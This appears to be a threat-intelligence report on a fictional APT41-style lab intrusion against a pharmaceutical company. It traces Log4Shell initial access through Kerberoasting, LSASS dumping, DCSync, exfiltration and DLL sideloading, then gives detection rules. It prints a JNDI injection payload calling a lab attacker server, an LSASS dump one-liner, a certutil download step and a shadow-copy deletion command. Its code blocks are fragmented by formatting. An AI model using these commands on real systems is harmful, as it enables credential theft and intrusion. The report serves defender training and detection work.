---
title: "APT41 Targeting Pharmaceutical Sector: Log4Shell to Domain Compromise"
description: "Threat Intelligence Report | Operation DragonRx"
image: "https://cdn-images-1.medium.com/max/800/1*Yx8PYav8kdkweKZ9U1Jftw.png"
---

# APT41 Targeting Pharmaceutical Sector: Log4Shell to Domain Compromise


<img src="https://cdn-images-1.medium.com/max/800/1*Yx8PYav8kdkweKZ9U1Jftw.png" alt="Cover image" width="2752" height="1536" loading="eager" fetchpriority="high" decoding="async" />

:::info Article Metadata
- **Category:** CTI
- **Source article:** [https://medium.com/@1200km/apt41-targeting-pharmaceutical-sector-log4shell-to-domain-compromise-9e4c1ba9dad6](https://medium.com/@1200km/apt41-targeting-pharmaceutical-sector-log4shell-to-domain-compromise-9e4c1ba9dad6)
- **Published:** 2026-05-02
- **Preserved media:** 18 image(s), including cover images, screenshots, diagrams, and infographics where present.
- **Preserved technical blocks:** 23 code/configuration block(s).
:::

## Ecosystem Fit

This page mirrors the original Medium article into the 1200km.com Docusaurus ecosystem. The original article flow, images, screenshots, infographics, and technical blocks are preserved from the export.

### Threat Intelligence Report | Operation DragonRx

**Classification:**TLP:CLEAR — Unrestricted distribution (FIRST TLP 2.0)
**Report ID:**CTI-2026-APT41–001
**Date:**2026–04–25
**Analyst:**Andrey Pautov (@1200km)
**Status:**Draft

&gt; Research notice: This report documents a representative APT41-style intrusion scenario constructed for adversary-emulation research and defender training. NovaTech Pharma, Operation DragonRx, the RxPhage implant, all IP addresses, credentials, and IOCs are fictional. The attack chain, techniques, and tooling are drawn from authoritative open-source APT41 reporting. This is a threat-intelligence product describing the attack as observed in the research scenario — not a confirmed APT41 intrusion. See the companion lab guide for hands-on reproduction: lab-architecture.md.

## Operation DragonRx series:

**CTI Report**

[**APT41 Targeting Pharmaceutical Sector: Log4Shell to Domain Compromise**
[Threat Intelligence Report | Operation DragonRx](2026-05-02-apt41-targeting-pharmaceutical-sector-log4shell-to-domain-compromise-9e4c1ba9dad6.md)

**Lab Architecture**

[**Lab Architecture — Operation DragonRx**
[Part of the Operation DragonRx series · Overview · Lab Architecture · Attack Playbook · DFIR Walkthrough](2026-05-02-lab-architecture-operation-dragonrx-38602f432e5c.md)

**Attack Playbook**

[**Attack Playbook — Operation DragonRx**
[Phase-by-Phase Attack Guide: Exact Commands Against the Deployed Lab](2026-05-04-attack-playbook-operation-dragonrx-91339316f0df.md)

**Detection Guide (in progress…)**

**DFIR Playbook (in progress…)**

**Malware Analysis (in progress…)**

## Table of Contents

- **Executive Summary**

- **Threat Actor Profile — APT41**

- **Campaign Overview**

- **Diamond Model**

- **Technical Analysis****
**5.1 Reconnaissance
5.2 Initial Access — Log4Shell
5.3 Foothold — Two-Layer Persistence
5.4 Internal Discovery
5.5 Credential Access
5.6 Lateral Movement
5.7 Collection
5.8 Exfiltration
5.9 Persistence — DLL Sideloading on DC
5.10 Impact — Ransomware (Optional)

- **Tools & Infrastructure Inventory**

- **Full ATT&CK TTP Matrix**

- **Indicators of Compromise**

- **Detection Opportunities**

- **Defensive Recommendations**

- **Dwell Time & Alert Timeline Analysis**

- **Attribution Assessment**

- **References**

## 1. Executive Summary

This report documents the technical analysis of an APT41-pattern intrusion against NovaTech Pharma Inc., a fictional pharmaceutical organization. The campaign — designated Operation DragonRx — follows TTPs drawn from authoritative APT41 reporting: the 2020 US Department of Justice indictment [1], Mandiant’s Double Dragon report [2], and Mandiant’s 2022 documentation of APT41 exploiting Log4Shell against US state government networks [3].

**Key findings:**

- **Initial access via CVE-2021–44228 (Log4Shell)**against a Java web application logging the`X-Api-Version`HTTP header. Exploitation relied on JDK 8 pre-u191 remote codebase loading. APT41 exploited this vulnerability against US state government networks within hours of public disclosure in December 2021.

- **Dual persistence from day one:**China Chopper-pattern JSP webshell plus a custom Go-based implant (RxPhage), providing two independent access channels before any lateral movement — consistent with documented APT41 operational discipline.

- **Internet to full domain compromise in under 72 hours.**Pivot chain: plaintext LDAP credentials recovered from a Tomcat configuration file → Kerberoasting a service account with local admin rights on a workstation → LSASS dump revealing cached Domain Admin credentials → DCSync for all domain hashes.

- **2.31 GB of Phase III clinical trial data and manufacturing documentation exfiltrated**via HTTPS C2, with a DNS tunnel maintained as a backup channel. Exfiltration completed 16 hours before the SOC escalation that opened the incident.

- **DLL sideloading persistence on the Domain Controller**using a signed Oracle Java binary alongside a malicious`jvm.dll`, consistent with documented APT41 PlugX deployment methodology.

- **Dwell time: 4 days, 17 hours, 37 minutes.**All 12 detection alerts generated correctly by the SIEM stack. None reviewed until Day 6. Detection failed at the triage layer, not the tooling layer.

- **Optional ransomware deployment**emulates the dual-use criminal track assessed in APT41 reporting — espionage objectives satisfied, criminal monetization following.

**Confidence in APT41 TTP fidelity:**HIGH for Log4Shell rapid weaponization cadence, China Chopper webshell, and DLL sideloading pattern. MODERATE-HIGH for credential access techniques and certutil LOLBAS use. LOW for Sliver C2 and dnscat2 as APT41-specific tooling — both are generic. Attribution to APT41 in a real incident requires primary intelligence sources beyond technique overlap.

**TTP coverage:**38 technique-rows mapped across 11 tactic categories (37 unique MITRE IDs; T1574.002 mapped under both Persistence and Defense Evasion).

## 2. Threat Actor Profile — APT41

### Identity

<img src="https://cdn-images-1.medium.com/max/800/1*DrTW5f1z6nLGqk6OekioKg.png" alt="Article image" width="1672" height="941" loading="lazy" decoding="async" />

### Operational Duality

APT41 is one of the most extensively documented China-nexus groups assessed to conduct both state-sponsored espionage and financially motivated criminal operations. Mandiant (2019) assessed — using explicit probabilistic language — that criminal activity occurs “potentially outside of state control” and for “what appears to be personal financial gain” [2]. This creates a scenario, assessed across multiple campaigns, where the same victim may be penetrated for IP theft under state tasking and subsequently monetized through ransomware or other fraud. The DOJ indictment supports the Chengdu 404-linked criminal charges and alleged MSS-related connections, but the precise model of state-direction versus independent criminal activity varies by campaign and should not be described as a clean, universal “MSS contractor model” without per-case qualification [1].

### Documented Rapid Weaponization

APT41 has a documented pattern of exploiting newly disclosed vulnerabilities within hours to days of public disclosure. Mandiant (March 2022) documented the group exploiting CVE-2021–44228 (Log4Shell) against US state government networks within hours of public disclosure [3]. The same pattern appeared with Citrix CVE-2019–19781, Pulse Secure CVE-2019–11510, and multiple Zoho ManageEngine vulnerabilities [5]. Standard 30–90-day patching cycles are categorically insufficient against this actor. Emergency patching within 24–72 hours for internet-facing applications is the minimum adequate response for known APT41 target sectors.

### Primary Malware Families (documented)

PlugX, CROSSWALK, MESSAGETAP, ShadowPad, Cobalt Strike (shared/rented), custom Go/Python implants in attributed campaigns. China Chopper webshell is extensively documented across APT41 campaigns [2] [5] [6] [7].

## 3. Campaign Overview

<img src="https://cdn-images-1.medium.com/max/800/1*aQAPIcGzAKzK1GOSpx2tvw.png" alt="Article image" width="1672" height="941" loading="lazy" decoding="async" />

### Target Network Architecture (In Lab env for simulation)

[**Lab Architecture — Operation DragonRx**
[Part of the Operation DragonRx series · Overview · Lab Architecture · Attack Playbook · DFIR Walkthrough](2026-05-02-lab-architecture-operation-dragonrx-38602f432e5c.md)

```text
ATTACKER INFRASTRUCTURE (
10.0
.
0.0
/
24
)
  
10.0
.0
.5
    Kali Linux — attacker workstation
  
10.0
.0
.10
   Sliver C2 server (HTTPS listener :
443
)
  
10.0
.0
.20
   marshalsec JNDI exploit relay server
TARGET NETWORK (
192.168
.
10.0
/
24
) - NOVATECH
.LOCAL
  
192.168
.10
.100
  WEB01    Spring Boot + log4j-core 
2.14
.1
 (Java 
8
 pre-u191)
  
192.168
.10
.10
   DC01     Windows Server 
2019
 - Domain Controller
  
192.168
.10
.20
   FS01     Windows Server 
2019
 - File Server (Research, Manufacturing)
  
192.168
.10
.50
   WS01     Windows 
10
 
22
H2 - Researcher workstation (jsmith)
  
192.168
.10
.200
  SIEM     Wazuh + Elastic + Kibana
  (Zeek)          -        Passive monitoring, host-network mode
```

## 4. Diamond Model

The Diamond Model below describes the adversary cluster emulating APT41 TTPs in this campaign. “Basis” identifies the documented APT41 reporting each capability element derives from.

<img src="https://cdn-images-1.medium.com/max/800/1*bSe-mbDLp4IISMsttRzByw.png" alt="Article image" width="1672" height="941" loading="lazy" decoding="async" />

Capability notes:**[2]**documented in Mandiant Double Dragon;**[3]**documented in Mandiant Log4Shell/APT41 report; unmarked capabilities are generic techniques with low APT41-specific attribution value.

## 5. Technical Analysis

### 5.1 Reconnaissance — T1596.003, T1596.005, T1592.002, T1589.002, T1595.002

The actor conducted passive external reconnaissance before any direct interaction with target systems, consistent with documented APT41 pre-compromise behavior [2]. The reconnaissance phase produced near-certain vulnerability confirmation without generating any alerts on the target.

<img src="https://cdn-images-1.medium.com/max/800/1*kEFPXBG_OlGO38N0iF8Ryw.png" alt="Article image" width="1672" height="941" loading="lazy" decoding="async" />

**Critical observation:**The application error page returned a full Java stack trace in production, including the classpath entry`log4j-core-2.14.1.jar`. This misconfiguration — development-mode error handling left in production — provided near-certain Log4Shell confirmation before any exploit code was executed.

**Detection posture:**Effectively zero. CT log lookups are read-only external requests; Shodan queries its own index; the handful of HTTP GETs are indistinguishable from normal web crawler traffic.

### 5.2 Initial Access — Log4Shell CVE-2021–44228 — T1190

**Objective:**Achieve remote code execution on WEB01 via JNDI injection in the`X-Api-Version`HTTP header — the same vector documented by Mandiant in APT41's 2021 exploitation of US state government networks [3].

**Vulnerability:**CVE-2021–44228 affects Apache Log4j2 versions 2.0-beta9 through 2.15.0 [9]. The remote code execution chain — LDAP redirect to a remote Java class, loaded and instantiated by the victim JVM — depends on JDK 8 prior to 8u191, where`com.sun.jndi.ldap.object.trustURLCodebase`defaults to`true`. This target ran exactly such a configuration.

**Attack chain:**

<img src="https://cdn-images-1.medium.com/max/800/1*JSDecoAGnx84UJE7I68Drg.png" alt="Article image" width="1672" height="941" loading="lazy" decoding="async" />

```text
Attacker (curl) → WEB01 HTTP header logged 
by
 Log4j
               → Log4j JNDI lookup → JNDI relay (marshalsec :
1389
)
               → JNDI redirects JVM → Attacker HTTP server (Exploit.
class
)
               → WEB01 JVM instantiates Exploit 
class
               → Exploit executes bash reverse shell
               → Reverse shell 
to
 attacker :
4444
```

**Injected payload:**

```text
${
jndi:
ldap:
/
/10.0.0.20:1389/
Exploit
}
```

**Initial access level:**`www-data`— Tomcat service account on WEB01 (Linux).

**Primary forensic artifact:**The JNDI string is written verbatim to the Tomcat access log by Log4j, surviving even if the attacker clears shell history:

```text
10.0
.
0.5
 - - 
[20/Apr/2026:14:23:07]
 "GET / HTTP/
1.1
" 
200
 -
  X-Api-Version: ${jndi:ldap://
10.0
.
0.20
:
1389
/Exploit}
```

**Timeline:**Initial access at`2026-04-20 14:23:07 UTC`.

### 5.3 Foothold — Two-Layer Persistence — T1505.003, T1053.003

Before conducting any lateral movement, the actor established two independent persistence mechanisms on WEB01. APT41 is documented to deploy multiple persistence channels before moving laterally, ensuring access survives partial containment [2].

### Layer 1: JSP Webshell — T1505.003

The actor deployed a China Chopper-pattern JSP webshell — one of APT41’s most extensively documented persistence mechanisms [2] [5]. The deployment path was chosen to blend with legitimate static resources in the Tomcat webroot.

**Path:**`/opt/tomcat/webapps/ROOT/resources/imgs/cache.jsp`
**Access:**HTTP GET/POST to`http://192.168.10.100:8080/resources/imgs/cache.jsp?c=&lt;command&gt;`
**Detection signal:**Sysmon EID 11 (FileCreate) for`.jsp`in Tomcat webroot.

### Layer 2: RxPhage Custom Implant — T1053.003

The actor staged a custom Go-based beacon (RxPhage) modeled on APT41’s documented use of PlugX, CROSSWALK, and custom C2 implants [2] [6] [7]. Go binaries retain PCLNTAB symbol tables, providing analysts a full package/function map for reverse engineering.

**Binary path:**`/tmp/.cache/rxphage`
**Persistence:**`crontab @reboot`entry for`www-data`— survives reboots.
**C2:**HTTPS beacon to Sliver C2 at 60-second check-in intervals.
**User-Agent (distinctive):**`Mozilla/5.0 (Windows NT 10.0; Win64; x64) Oracle/Java-Update/8.0.361`

**Note on tool attribution:**Sliver C2 is a generic open-source framework used across many actor clusters. Its presence alone carries low APT41-attribution value; the combination with China Chopper and the DLL sideloading persistence (§5.9) is more diagnostic.

### 5.4 Internal Discovery — T1046, T1082, T1087.002, T1018, T1552.001

Operating from the`www-data`shell on WEB01, the actor conducted systematic internal reconnaissance to map the target environment and identify high-value credential material.

### Network Mapping

A ping sweep and targeted Nmap scan of the RFC 1918 /24 identified three Windows hosts:

<img src="https://cdn-images-1.medium.com/max/800/1*KnQpee6qeEDhhIMsfeA_XA.png" alt="Article image" width="1672" height="941" loading="lazy" decoding="async" />

**Detection signal:**Zeek`conn.log`records a port scan pattern sourced from`192.168.10.100`. Medium-confidence alert, Day 2.

### Credential Recovery from Configuration Files — T1552.001

The actor found plaintext LDAP service account credentials in Tomcat’s`context.xml`— a common misconfiguration in enterprise Java deployments:

```text
<
Resource
 
name
=
"ldap/NovaTech"
  
connectionURL
=
"ldap://192.168.10.10:389"
  
connectionName
=
"cn=svc_ldap,dc=novatech,dc=local"
  
connectionPassword
=
"NovaTech2021!"
 />
```

The account`svc_ldap`/`NovaTech2021!`was a valid AD service account in plaintext. This opened the full Active Directory to enumeration from the compromised Linux web server without any additional credential theft — a decisive force multiplier at this stage.

### AD Enumeration from Linux — T1087.002

Using the recovered`svc_ldap`credentials, the actor queried Active Directory via LDAP from WEB01, identifying all domain accounts and locating service accounts with registered SPNs — prerequisites for Kerberoasting.

**Key accounts identified:**

<img src="https://cdn-images-1.medium.com/max/800/1*uvftEb-cBV_C4riu_GmRvg.png" alt="Article image" width="1672" height="941" loading="lazy" decoding="async" />

### 5.5 Credential Access — T1558.003, T1003.001, T1003.006

### Kerberoasting — T1558.003

The`svc_backup`account carried a registered SPN, making it a Kerberoasting target. Using the`svc_ldap`credentials obtained from`context.xml`, the actor requested a Kerberos TGS ticket for`svc_backup`— encrypted with`svc_backup`'s NTLM hash and crackable offline with no further network interaction.

**Tool:**`impacket-GetUserSPNs`+ hashcat
**Crack result:**`svc_backup:Backup_Svc99!`
**Hash type:**`$krb5tgs$23$`— RC4-HMAC (0x17)

**Credential bridge:**The actor confirmed`svc_backup`held local administrator rights on WS01 — a common over-privilege pattern for backup service accounts — before proceeding. This established the pivot from the Linux web server to the first Windows shell.

**Detection signal:**Windows EID 4769 with`TicketEncryptionType: 0x17`. This is a signal, not a confirmation — baseline the environment; legacy applications forcing RC4 generate false positives. Contextualize against requesting account and time-of-day anomalies.

### LSASS Memory Dump — LOLBAS — T1003.001

After gaining a SYSTEM shell on WS01 (§5.6), the actor dumped LSASS memory using a signed Microsoft system library — no third-party tooling required.

**Technique:**`comsvcs.dll MiniDump`invoked via`rundll32.exe`[17]

```text
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 
<
LSASS_PID
>
 C:\Temp\lsass.dmp full
```

**Prerequisite — DA credential caching:**Domain Admin credentials reside in a workstation’s LSASS only if a DA has authenticated to that host. In this campaign, the NovaTech IT help-desk had logged into WS01 as`NOVATECH\Administrator`via RDP three days before the intrusion (EID 4624 LogonType 10) to resolve a driver conflict. Windows retains cached credential material until the next reboot; WS01 had not been rebooted since. In real engagements, BloodHound`HasSession`edges [12] identify exactly which hosts hold active DA sessions — making this a targetable condition rather than a guess.

**Dump contents:**`jsmith`NTLM hash;`Administrator`NTLM hash. WDigest is disabled by default on Windows 10 / Server 2016+; cleartext recovery from LSASS is not expected in this environment unless explicitly re-enabled via registry.

**Detection signal:**Sysmon EID 10 (ProcessAccess) —`rundll32.exe`accessing`lsass.exe`. Critical alert generated Day 4 at 10:15; unreviewed for 21 hours and 45 minutes.

### DCSync — T1003.006

With Domain Admin credentials from the LSASS dump, the actor issued replication requests directly to DC01, impersonating a legitimate domain controller. This required both DS-Replication-Get-Changes (GUID`1131f6aa`) and DS-Replication-Get-Changes-All (GUID`1131f6ad`) [15].

**Tool:**`impacket-secretsdump`
**Result:**Every domain account's NTLM hash, including`krbtgt`. With the`krbtgt`hash, Golden Tickets can be forged — Kerberos tickets granting access to any service, valid even after regular account password resets.

**Recovery implication:**Incident recovery requires at minimum a`krbtgt`double-rotation (two resets ≥10 hours apart) plus full credential rotation for all domain accounts. Domain rebuild may be warranted depending on confidence in persistence enumeration completeness.

**Detection signal:**Windows EID 4662 —`DS-Replication-Get-Changes-All`GUID from a non-DC host.**Critical prerequisite:**Directory Service Access auditing must be explicitly enabled and a SACL must be configured on the domain NC object. Without both, EID 4662 will not fire. Verify audit configuration before relying on this detection [15].

### 5.6 Lateral Movement — T1550.002, T1021.002

**Full pivot chain:**

<img src="https://cdn-images-1.medium.com/max/800/1*yLyPDKCksOANr7gFBHMsVQ.png" alt="Article image" width="1672" height="941" loading="lazy" decoding="async" />

```text
WEB01 (Linux, www-data)
  ──
[svc_ldap from context.xml]
──────► LDAP enumeration → Kerberoast svc_backup
  ──
[svc_backup local admin on WS01]
─► WS01 (Windows, SYSTEM via PsExec)
  ──
[LSASS dump → Administrator NTLM]
► DC01 (Windows, SYSTEM via PtH)
  ──
[DCSync]
─────────────────────────► Full domain
```

### Linux to WS01 — Impacket PsExec (T1021.002)

Using cracked`svc_backup`credentials with confirmed local admin rights on WS01, the actor moved directly from the Linux web server to a SYSTEM shell on the Windows workstation using Impacket's PsExec implementation.

### WS01 to DC01 — Pass-the-Hash (T1550.002)

After extracting the Administrator NTLM hash from WS01’s LSASS dump, the actor authenticated to DC01 using the hash directly — no password cracking required. A subnet-wide CrackMapExec sweep confirmed the hash was reused across multiple hosts before the DC shell was established.

### WMI for Quiet Remote Execution (T1047)

WMI remote execution was used for reconnaissance commands — it creates no Service Control Manager record, producing less telemetry noise than repeated PsExec invocations.

**Detection signals:**

- Windows EID 4624 (`LogonType: 3`) from a Linux-sourced IP (`192.168.10.100`) to a Windows domain host — high-confidence anomaly. NTLM authentication from a Linux IP to a Windows domain member is an unusual pattern that should trigger investigation.

- Impacket PsExec creates a randomized-name service visible as Sysmon EID 1 and Windows EID 4697 (service installed).

### 5.7 Collection — T1005, T1074.001, T1560.001

From a SYSTEM shell on DC01, the actor mapped file server shares containing the target data, staged a local copy, and compressed it using a password-encrypted archive — consistent with APT41’s documented use of LOLBAS utilities for staging [16].

The actor mounted Research and Manufacturing shares from FS01 using Domain Admin credentials, then added SYSVOL to the collection. Data was staged to`C:\Temp\archive\`before compression.

**Staging tool:**`certutil.exe -urlcache -f`used to download the 7-Zip standalone binary from the attacker's HTTP server — a signed Windows binary as a download manager. This LOLBAS pattern is documented in APT41 campaigns [16]. The compressed archive was password-encrypted (`-p"RxPhage2024!" -mx9`), rendering content inspection ineffective without the key.

**Total staged:**2.31 GB password-encrypted archive.

### 5.8 Exfiltration — T1041, T1048.001

### Primary Channel: HTTPS via C2 — T1041

Prior to exfiltration, the operator placed the beacon in interactive mode (`sleep 0`), removing the 60-second check-in delay to enable streaming transfer at sustained throughput. Normal beacon cadence was restored immediately after transfer completion to reduce C2 traffic noise.

**Exfiltration window:**Day 5, 04:00–16:18 UTC — 12 hours 18 minutes.
**Volume:**2.31 GB at approximately 52 KB/s average throughput.
**Completed:**15 hours and 42 minutes before the Day 6 08:00 SOC escalation (Day 5 16:18 → Day 6 08:00).

Zeek`conn.log`recorded long-duration HTTPS sessions to the C2 IP with sustained byte counts — distinguishable from normal beacon rhythm by session duration and total bytes transferred, not connection frequency. The Windows SRUM database (`SRUDB.dat`) independently corroborated 2.31 GB sent from`java.exe`— an artifact that survives even if network captures are unavailable.

### Backup Channel: DNS Tunneling — T1048.001

APT41 is assessed to maintain custom DNS C2 capabilities [5]. The actor established a dnscat2 tunnel from WEB01 as a backup exfiltration and persistence channel. The`--secret`flag enables HMAC-based symmetric encryption (T1048.001); without it, the applicable sub-technique would be T1048.003.

**Detection:**High-entropy DNS subdomain labels from`192.168.10.100`— Zeek DNS analysis flags subdomain labels exceeding 40 characters with entropy above 3.5 bits/character. An additional medium-confidence tier covers labels &gt;20 characters with entropy &gt;3.5 restricted to TXT/CNAME/NULL query types to reduce false positives from CDN and SPF records.

### 5.9 Persistence — DLL Sideloading — T1574.002, T1053.005

With full domain access secured and data exfiltrated, the actor deployed a persistent backdoor on DC01 designed to survive reboots and blend with legitimate Oracle Java infrastructure. This technique is consistent with documented APT41 PlugX deployment methodology [2] [6] [7].

**Technique:**DLL search-order hijacking (sideloading). A legitimate, signed Oracle`java.exe`was copied to an attacker-controlled directory (`C:\ProgramData\Oracle\Java\javapath\`) alongside a malicious`jvm.dll`named to intercept the binary's DLL load order. A scheduled task configured to run as SYSTEM at startup provided the persistence trigger.

**Scheduled task:**`JavaUpdateService`— ONSTART, SYSTEM — indistinguishable by name from a legitimate Java maintenance task.

**Timestomping (T1070.006):**`LastWriteTime`of the malicious DLL was set to`2023-01-15`to obscure the installation date. This is detectable: the NTFS`$FILE_NAME`MFT attribute (updated by the kernel on actual file creation) retains the real timestamp. Forensic comparison of`$STANDARD_INFORMATION`vs`$FILE_NAME`timestamps exposes the discrepancy.

**Primary detection signal:**Sysmon EID 7 (Image Load) —`jvm.dll`loaded by`java.exe`with`Signed: false`. A legitimate Oracle JVM DLL carries a valid Oracle code-signing certificate. An unsigned DLL loaded from`C:\ProgramData`by`java.exe`is a high-confidence sideloading indicator regardless of the parent binary's publisher.

### 5.10 Impact — Ransomware (Optional) — T1562.001, T1490, T1486

APT41 is assessed — not confirmed — to have deployed ransomware in specific campaigns as part of the criminal operational track following espionage data collection [2]. In this campaign, the ransomware phase is optional and represents post-espionage monetization.

The actor followed a documented pre-ransomware sequence: disable Windows Defender via registry and PowerShell (`T1562.001`), delete Volume Shadow Copies via`vssadmin delete shadows /all /quiet`to inhibit recovery (`T1490`), then deploy the encryptor against target data paths (`T1486`).

**ATT&CK mapping notes:**

- `vssadmin delete shadows`maps to**T1490 (Inhibit System Recovery)**— deleting recovery mechanisms, not data.

- Encryption maps to**T1486 (Data Encrypted for Impact)**.

- T1485 (Data Destruction) applies to direct overwrite/destruction, not recovery mechanism deletion.

**Primary detection signal:**Process creation telemetry (Sysmon EID 1 / Windows EID 4688) matching`vssadmin`,`wmic`,`diskshadow`, or`wbadmin`with delete/remove arguments. Windows EID 524 (VSS deleted event) is supplementary but does not capture the calling command line and should not serve as the primary detection signal.

## 6. Tools & Infrastructure Inventory

### Attacker Tooling

<img src="https://cdn-images-1.medium.com/max/800/1*EYICw6_-hcgqEJ2ADHIG8Q.png" alt="Article image" width="1672" height="941" loading="lazy" decoding="async" />

### C2 Infrastructure (Lab env)

<img src="https://cdn-images-1.medium.com/max/800/1*Y5yCc8zkwqnOfehwRS5FPQ.png" alt="Article image" width="1672" height="941" loading="lazy" decoding="async" />

## 7. Full ATT&CK TTP Matrix

38 technique-rows across 11 tactic categories. 37 unique MITRE IDs — T1574.002 mapped under both Persistence and Defense Evasion per ATT&CK guidance for dual-purpose techniques.

<img src="https://cdn-images-1.medium.com/max/800/1*ZG9lI2TDtlahOqwCR8C2Cw.png" alt="Article image" width="1672" height="941" loading="lazy" decoding="async" />

## 8. Indicators of Compromise

&gt; All IOCs below correspond to the Operation DragonRx research scenario. They are fictional and have no correlation to real threat actor infrastructure.

<img src="https://cdn-images-1.medium.com/max/800/1*GzRryHnA9aq6qOayprR8GQ.png" alt="Article image" width="1672" height="941" loading="lazy" decoding="async" />

### YARA Rule (RxPhage scenario)

```text
rule RxPhage_PlugXLite {
    meta:
        author      = 
"Andrey Pautov"
        description = 
"Detects RxPhage implant pattern — Operation DragonRx research scenario"
        
date
        = 
"2026-04"
strings:
        
$go_beacon
  = 
"rxphage/beacon"
 ascii
        
$go_evasion
 = 
"rxphage/evasion"
 ascii
        
$c2_path1
   = 
"/api/v2/telemetry"
 ascii
        
$c2_path2
   = 
"/api/v2/analytics"
 ascii
        
$mutex
      = 
"JavaUpdateMutex"
 ascii wide
        
$ua
         = 
"Oracle/Java-Update"
 ascii
        
$pclntab
    = { FF FF FF FB 00 00 }
    condition:
        filesize < 25MB and
        /* PE (Windows loader/DLL) or ELF (Linux beacon) */
        (uint16(0) == 0x5A4D or uint32(0) == 0x464C457F) and
        (
            (2 of (
$go_beacon
, 
$go_evasion
)) or
            (
$c2_path1
 and 
$c2_path2
) or
            (
$mutex
 and 
$ua
 and 
$pclntab
)
        )
}
```

## 9. Detection Opportunities

### Alert Timeline vs. Review Timeline

<img src="https://cdn-images-1.medium.com/max/800/1*HQdHXYaGgcltRVK4RQc5UA.png" alt="Article image" width="1672" height="941" loading="lazy" decoding="async" />

**12 actionable alerts. All generated. None reviewed until Day 6. Detection failed at triage, not tooling.**

### Detection Rules

### Log4Shell — Zeek (network-layer)

```text
event 
http_header
(
c
: connection, 
is_orig
: 
bool
, 
name
: 
string
, 
value
: 
string
) {
    local jndi_pattern = /\$\{[a-zA-Z0-
9
_\-:\/\.]*jndi[a-zA-Z0-
9
_\-:\/\.]*:/;
    
if
 ( is_orig && jndi_pattern in value ) {
        
NOTICE
([
$note
=
Notice
::
LOG
, 
$conn
=c,
                
$msg
=
fmt
(
"Log4Shell JNDI in header %s: %s"
, name, value)]);
    }
}
```

### LSASS Memory Access — Wazuh (Sysmon EID 10)

```text
<
rule
 
id
=
"100110"
 
level
=
"15"
>
  
<
if_group
>
sysmon_event10
</
if_group
>
  
<
field
 
name
=
"win.eventdata.targetImage"
 
type
=
"pcre2"
>
(?i)lsass\.exe
</
field
>
  
<
description
>
LSASS memory access — credential dumping (T1003.001)
</
description
>
</
rule
>
```

### DCSync — Elastic KQL (Windows EID 4662)

```text
event.code:4662 AND
winlog.event_data.Properties:(
  *1131f6ad-9c07-11d1-f79f-00c04fc2dcd2* OR
  *1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*
) AND
NOT winlog.computer_name:(DC01* OR DC02*)
```

&gt; Prerequisite: Directory Service Access auditing must be explicitly enabled (Computer Configuration → Advanced Audit Policy → DS Access → Audit Directory Service Access) AND a SACL must be configured on the domain NC object. Without both, EID 4662 will not generate [15].

### Kerberoasting — Elastic KQL (Windows EID 4769)

```text
event.code:4769 AND
winlog.event_data.TicketEncryptionType:0x17 AND
NOT winlog.event_data.ServiceName:*$
```

&gt; Caveat: EID 4769 + RC4 is a signal, not a confirmation. Baseline the environment; legacy applications forcing RC4 generate false positives. Contextualize against requesting account, requesting host, and time-of-day.

### DLL Sideloading — Elastic KQL (Sysmon EID 7)

```text
event.code:7 AND
winlog.event_data.Signed:false AND
winlog.event_data.ImageLoaded:*jvm.dll AND
NOT winlog.event_data.ImageLoaded:*\\Program Files\\*
```

### VSS Deletion — Sysmon EID 1 / Windows EID 4688

```text
event.code:1 AND
process.name:(vssadmin.exe OR wmic.exe OR diskshadow.exe OR wbadmin.exe) AND
process.command_line:(*delete* OR *remove*)
```

### DNS Tunneling — Zeek Entropy Analysis

```text
import math, os
def entropy(s):
    freq = {}
    
for
 c in s: fre
q[c]
 = freq.get(c, 
0
) + 
1
    
return
 -sum(p/len(s)*math.log2(p/len(s)) 
for
 p in freq.values())
# Thresholds:
#   HIGH:   subdomain >40 chars AND entropy >3.5
#   MEDIUM: subdomain >20 chars AND entropy >3.5 AND qtype in (TXT, CNAME, NULL)
# Combining length and query-type filters reduces CDN/SPF false positives.
log
 = 
"/usr/local/zeek/logs/current/dns.log"
if
 
not
 os.path.exists(
log
):
    
print
(
"dns.log not found"
)
else
:
    with 
open
(
log
) as f:
        
for
 line in f:
            
if
 line.startswith(
'#'
): 
continue
            fields = line.strip().
split
(
'\t'
)
            
if
 len(fields) < 
14
: 
continue
            query   = fields[
9
]
            qtype   = fields[
13
] 
if
 len(fields) > 
13
 
else
 
""
            
sub
     = 
query
.
split
('.')[0]
            
sub_ent
 = 
entropy
(
sub
) 
if
 
len
(
sub
) > 1 
else
 0
            
if
 
len
(
sub
) > 40 
and
 
sub_ent
 > 3.5:
                
print
(
f
"[
DNS
 
TUNNEL
 
HIGH
] 
{query}  len={len(
sub
)}  
entropy
=
{sub_ent:.
2
f}  qtype=
{qtype}
")
            elif len(sub) > 20 and sub_ent > 3.5 and qtype in ("
TXT
", "
CNAME
", "
NULL
"):
                print(f"
[DNS TUNNEL MED]  
{query}
  len={len(
sub
)}  
entropy
=
{sub_ent:.
2
f}  qtype=
{qtype}
")
```

### YARA-L 2.0 Detection Rules (Google SecOps / Chronicle UDM)

```text
rule apt41_log4shell_jndi_header {
  meta:
    author      = 
"Andrey Pautov"
    description = 
"Log4Shell JNDI injection pattern in HTTP header (T1190)"
    severity    = 
"CRITICAL"
    technique   = 
"T1190"
events:
    $e.metadata.event_type = 
"NETWORK_HTTP"
    (
      re.
regex
($e.network.http.request_headers, `(?i)\$\{
[^\}]
*jndi
[^\}]
*:`) or
      re.
regex
($e.target.url, `(?i)\$\{
[^\}]
*jndi
[^\}]
*:`)
    )
  condition:
    $e
}
```

```text
rule apt41_lsass_memory_access {
  meta:
    author      = 
"Andrey Pautov"
    description = 
"LSASS process memory access — credential dumping (T1003.001)"
    severity    = 
"CRITICAL"
    technique   = 
"T1003.001"
events:
    $e.metadata.event_type = 
"PROCESS_OPEN"
    re.regex($e.target.process.file.full_path, 
`(?i)lsass\.exe`
)
  condition:
    $e
}
```

```text
rule apt41_dcsync_replication_rights {
  meta:
    author      = 
"Andrey Pautov"
    description = 
"DCSync — DS-Replication-Get-Changes(-All) from non-DC host (T1003.006)"
    severity    = 
"CRITICAL"
    technique   = 
"T1003.006"
    prereq      = 
"Directory Service Access auditing + NC SACL required"
events:
    $e.metadata.event_type        = 
"USER_RESOURCE_ACCESS"
    $e.metadata.product_event_type = 
"4662"
    re.regex(
      $e.target.resource.attribute.labels[
"Properties"
],
      
`1131f6a[ad]-9c07-11d1-f79f-00c04fc2dcd2`
    )
    
not
 re.regex($e.principal.hostname, 
`(?i)^DC`
)
  condition:
    $e
}
```

```text
rule apt41_kerberoasting_rc4_tgs {
  meta:
    author      = 
"Andrey Pautov"
